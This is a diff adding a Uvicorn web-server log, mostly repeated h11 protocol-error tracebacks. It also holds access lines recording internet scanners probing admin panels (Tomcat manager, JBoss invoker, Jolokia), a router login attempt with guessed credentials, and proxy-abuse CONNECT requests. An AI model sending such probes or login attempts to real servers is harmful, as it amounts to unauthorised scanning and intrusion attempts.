+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     152.67.42.78:52158 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     142.93.228.14:55462 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     197.210.85.7:45436 - "GET / HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:59125 - "GET http%3A//www.eliteproxyswitcher.com/proxyjudge.html HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:59246 - "CONNECT store.steampowered.com%3A443 HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:59474 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     165.22.236.193:6332 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+INFO:     159.69.165.35:43654 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:54396 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     128.199.23.118:21488 - "POST /3535/inc/e93cc142f47fdc.php HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:60328 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     185.128.41.50:46186 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:59894 - "GET http%3A//www.eliteproxyswitcher.com/proxyjudge.html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:47408 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     205.185.122.102:33542 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+INFO:     52.249.249.127:49725 - "CONNECT beta-api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:63962 - "CONNECT beta-api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:62742 - "CONNECT beta-api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:61364 - "CONNECT beta-api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+INFO:     52.249.249.127:60239 - "CONNECT beta-api.crunchyroll.com%3A443 HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:39412 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:50682 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:41892 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:51404 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     65.49.20.68:45498 - "GET / HTTP/1.1" 404 Not Found
+INFO:     192.241.206.122:41534 - "GET /manager/text/list HTTP/1.1" 404 Not Found
+INFO:     162.142.125.55:36488 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.55:39208 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:50268 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+INFO:     194.48.199.121:53466 - "GET /jolokia/list HTTP/1.1" 404 Not Found
+INFO:     223.130.28.80:1206 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:58060 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     192.241.210.30:35344 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:41882 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     107.173.171.197:46662 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:42010 - "GET /script HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+INFO:     194.48.199.121:54324 - "GET /invoker/readonly HTTP/1.1" 404 Not Found
+INFO:     13.52.235.187:46564 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:46446 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:36090 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:46352 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     209.17.97.50:41497 - "GET / HTTP/1.1" 404 Not Found
+INFO:     178.72.78.233:12423 - "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 68, in maybe_read_from_IDLE_client
+    raise LocalProtocolError("illegal request line")
+h11._util.RemoteProtocolError: illegal request line
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:39258 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.40.103:53200 - "GET /script HTTP/1.1" 404 Not Found
+INFO:     209.17.96.130:59604 - "GET / HTTP/1.0" 404 Not Found
+INFO:     205.185.122.102:40430 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:57842 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:33992 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     74.120.14.37:40252 - "GET / HTTP/1.1" 404 Not Found
+INFO:     74.120.14.37:33056 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     205.185.122.4:45860 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
+INFO:     209.141.48.244:33356 - "GET /manager/html HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 73, in maybe_read_from_IDLE_client
+    request_line_re, lines[0], "illegal request line: {!r}", lines[0]
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 88, in validate
+    raise LocalProtocolError(msg)
+h11._util.RemoteProtocolError: illegal request line: bytearray(b'admin')
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/uvicorn/protocols/http/h11_impl.py", line 172, in handle_events
+    event = self.conn.next_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 443, in next_event
+    exc._reraise_as_remote_protocol_error()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_util.py", line 76, in _reraise_as_remote_protocol_error
+    raise self
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 425, in next_event
+    event = self._extract_next_receive_event()
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_connection.py", line 367, in _extract_next_receive_event
+    event = self._reader(self._receive_buffer)
+  File "/home/ubuntu/.local/lib/python3.6/site-packages/h11/_readers.py", line 203, in expect_nothing
+    raise LocalProtocolError("Got data when expecting EOF")
+h11._util.RemoteProtocolError: Got data when expecting EOF
